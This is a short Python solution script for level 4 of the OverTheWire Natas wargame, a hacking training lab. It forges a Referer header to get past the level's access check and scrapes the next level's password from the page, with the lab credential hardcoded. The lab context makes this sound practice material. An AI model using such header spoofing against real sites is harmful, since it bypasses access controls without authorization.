# webscraper for natas4
from bs4 import BeautifulSoup
import requests
import os

username = 'natas4'
password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'
url = 'http://%s.natas.labs.overthewire.org' % username
uriString = ''

def initialRequest():
    session = requests.Session()
    resp = session.get(url, auth=(username, password), headers={'referer': 'http://natas5.natas.labs.overthewire.org/'})
    content = resp.text
    soup = BeautifulSoup(content, 'html.parser')
    natasPass = soup.findAll('div')[0]
    print(natasPass.getText())

initialRequest()


